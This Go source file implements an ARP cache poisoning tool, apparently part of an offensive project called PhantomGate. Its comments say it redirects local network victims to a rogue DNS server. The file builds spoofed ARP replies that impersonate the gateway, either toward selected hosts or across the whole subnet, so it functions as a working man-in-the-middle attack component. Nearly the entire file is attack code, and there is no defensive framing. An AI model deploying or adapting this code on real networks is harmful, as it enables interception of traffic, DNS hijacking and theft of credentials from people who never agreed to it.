package dns

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"sync"
	"time"
)

// ARPPoisoner performs ARP cache poisoning to redirect network traffic
// through PhantomGate. This makes victims on the local network use
// our rogue DNS server instead of the legitimate one.
type ARPPoisoner struct {
	iface      *net.Interface
	attackerIP net.IP
	attackerMAC net.HardwareAddr
	gatewayIP  net.IP
	gatewayMAC net.HardwareAddr
	targetIPs  []net.IP  // Specific targets (empty = entire subnet)
	victims    map[string]net.HardwareAddr // IP → MAC cache
	mu         sync.RWMutex
	running    bool
	stopChan   chan struct{}
	interval   time.Duration
}

// ARPConfig configures the ARP poisoner
type ARPConfig struct {
	// Network interface to use (e.g., "eth0", "wlan0")
	Interface string
	// Gateway IP to impersonate
	GatewayIP string
	// Specific target IPs (empty = poison entire subnet)
	TargetIPs []string
	// Poison interval in seconds (default: 2)
	IntervalSecs int
}

// NewARPPoisoner creates a new ARP cache poisoner
func NewARPPoisoner(cfg ARPConfig) (*ARPPoisoner, error) {
	iface, err := net.InterfaceByName(cfg.Interface)
	if err != nil {
		return nil, fmt.Errorf("interface '%s' not found: %w", cfg.Interface, err)
	}

	// Get our IP on this interface
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, fmt.Errorf("failed to get interface addresses: %w", err)
	}

	var attackerIP net.IP
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && ipNet.IP.To4() != nil {
			attackerIP = ipNet.IP.To4()
			break
		}
	}
	if attackerIP == nil {
		return nil, fmt.Errorf("no IPv4 address found on interface %s", cfg.Interface)
	}

	gatewayIP := net.ParseIP(cfg.GatewayIP).To4()
	if gatewayIP == nil {
		return nil, fmt.Errorf("invalid gateway IP: %s", cfg.GatewayIP)
	}

	var targetIPs []net.IP
	for _, t := range cfg.TargetIPs {
		ip := net.ParseIP(t).To4()
		if ip != nil {
			targetIPs = append(targetIPs, ip)
		}
	}

	interval := time.Duration(cfg.IntervalSecs) * time.Second
	if interval == 0 {
		interval = 2 * time.Second
	}

	return &ARPPoisoner{
		iface:       iface,
		attackerIP:  attackerIP,
		attackerMAC: iface.HardwareAddr,
		gatewayIP:   gatewayIP,
		targetIPs:   targetIPs,
		victims:     make(map[string]net.HardwareAddr),
		stopChan:    make(chan struct{}),
		interval:    interval,
	}, nil
}

// Start begins ARP poisoning
func (ap *ARPPoisoner) Start() error {
	// Resolve gateway MAC address
	var err error
	ap.gatewayMAC, err = ap.resolveMAC(ap.gatewayIP)
	if err != nil {
		return fmt.Errorf("failed to resolve gateway MAC for %s: %w", ap.gatewayIP, err)
	}

	log.Printf("[⚡ ARP POISON] Starting on interface %s", ap.iface.Name)
	log.Printf("[⚡ ARP POISON] Attacker: %s (%s)", ap.attackerIP, ap.attackerMAC)
	log.Printf("[⚡ ARP POISON] Gateway:  %s (%s)", ap.gatewayIP, ap.gatewayMAC)

	if len(ap.targetIPs) > 0 {
		log.Printf("[⚡ ARP POISON] Targeting %d specific hosts", len(ap.targetIPs))
		for _, ip := range ap.targetIPs {
			mac, err := ap.resolveMAC(ip)
			if err != nil {
				log.Printf("[ARP] Warning: Could not resolve %s: %v", ip, err)
				continue
			}
			ap.mu.Lock()
			ap.victims[ip.String()] = mac
			ap.mu.Unlock()
		}
	} else {
		log.Printf("[⚡ ARP POISON] Targeting entire subnet (broadcast)")
	}

	ap.running = true
	go ap.poisonLoop()
	return nil
}

// Stop halts ARP poisoning and restores ARP caches
func (ap *ARPPoisoner) Stop() {
	ap.running = false
	close(ap.stopChan)

	// Restore legitimate ARP entries
	log.Printf("[ARP] Restoring ARP caches...")
	ap.restoreARP()
	log.Printf("[ARP] ARP poisoner stopped, caches restored")
}

func (ap *ARPPoisoner) poisonLoop() {
	ticker := time.NewTicker(ap.interval)
	defer ticker.Stop()

	for {
		select {
		case <-ap.stopChan:
			return
		case <-ticker.C:
			ap.sendPoison()
		}
	}
}

// sendPoison sends ARP reply packets to poison victim caches
// We tell victims: "The gateway MAC is MY MAC" (so their traffic comes to us)
// We tell the gateway: "The victim MAC is MY MAC" (so return traffic comes to us too)
func (ap *ARPPoisoner) sendPoison() {
	if len(ap.targetIPs) > 0 {
		// Targeted poisoning
		ap.mu.RLock()
		for ip, mac := range ap.victims {
			victimIP := net.ParseIP(ip).To4()
			// Tell victim: gateway is at our MAC
			ap.sendARPReply(victimIP, mac, ap.gatewayIP, ap.attackerMAC)
			// Tell gateway: victim is at our MAC
			ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, victimIP, ap.attackerMAC)
		}
		ap.mu.RUnlock()
	} else {
		// Broadcast poisoning — tell everyone on the subnet that we're the gateway
		broadcastMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
		ap.sendARPReply(net.IPv4(255, 255, 255, 255), broadcastMAC, ap.gatewayIP, ap.attackerMAC)
	}
}

// restoreARP sends correct ARP entries to undo the poisoning
func (ap *ARPPoisoner) restoreARP() {
	for i := 0; i < 5; i++ {
		ap.mu.RLock()
		for ip, mac := range ap.victims {
			victimIP := net.ParseIP(ip).To4()
			// Tell victim: gateway is at the REAL gateway MAC
			ap.sendARPReply(victimIP, mac, ap.gatewayIP, ap.gatewayMAC)
			// Tell gateway: victim is at the REAL victim MAC
			ap.sendARPReply(ap.gatewayIP, ap.gatewayMAC, victimIP, mac)
		}
		ap.mu.RUnlock()
		time.Sleep(500 * time.Millisecond)
	}
}

// sendARPReply constructs and sends a raw ARP reply packet
func (ap *ARPPoisoner) sendARPReply(dstIP net.IP, dstMAC net.HardwareAddr, spoofIP net.IP, spoofMAC net.HardwareAddr) {
	// Build Ethernet frame + ARP packet
	packet := make([]byte, 42) // 14 (ethernet) + 28 (ARP)

	// Ethernet header
	copy(packet[0:6], dstMAC)          // Destination MAC
	copy(packet[6:12], spoofMAC)       // Source MAC (ours)
	binary.BigEndian.PutUint16(packet[12:14], 0x0806) // EtherType: ARP

	// ARP header
	binary.BigEndian.PutUint16(packet[14:16], 0x0001) // Hardware type: Ethernet
	binary.BigEndian.PutUint16(packet[16:18], 0x0800) // Protocol type: IPv4
	packet[18] = 6                                      // Hardware size: 6 (MAC)
	packet[19] = 4                                      // Protocol size: 4 (IPv4)
	binary.BigEndian.PutUint16(packet[20:22], 0x0002) // Opcode: Reply

	// Sender hardware + protocol address (what we're claiming)
	copy(packet[22:28], spoofMAC)       // Sender MAC (ours)
	copy(packet[28:32], spoofIP.To4())  // Sender IP (gateway's IP — the lie)

	// Target hardware + protocol address
	copy(packet[32:38], dstMAC)         // Target MAC
	copy(packet[38:42], dstIP.To4())    // Target IP

	// Send raw packet
	if err := ap.sendRawPacket(packet); err != nil {
		log.Printf("[ARP] Failed to send ARP reply: %v", err)
	}
}

// sendRawPacket sends a raw ethernet frame via a raw socket
func (ap *ARPPoisoner) sendRawPacket(packet []byte) error {
	fd, err := openRawSocket(ap.iface.Index)
	if err != nil {
		return fmt.Errorf("raw socket error: %w", err)
	}
	defer closeRawSocket(fd)

	return sendOnSocket(fd, ap.iface.Index, packet)
}

// resolveMAC resolves an IP address to a MAC address using ARP
func (ap *ARPPoisoner) resolveMAC(ip net.IP) (net.HardwareAddr, error) {
	// First try the system ARP cache
	// Use arping-style resolution
	neighbors, err := net.LookupAddr(ip.String())
	_ = neighbors

	// Fallback: send ARP request and wait for reply
	// For simplicity, we'll use the system's ARP table
	mac, err := getARPEntry(ip)
	if err != nil {
		// Trigger ARP resolution by pinging
		triggerARPResolution(ip)
		time.Sleep(1 * time.Second)
		mac, err = getARPEntry(ip)
		if err != nil {
			return nil, fmt.Errorf("could not resolve MAC for %s: %w", ip, err)
		}
	}

	return mac, nil
}
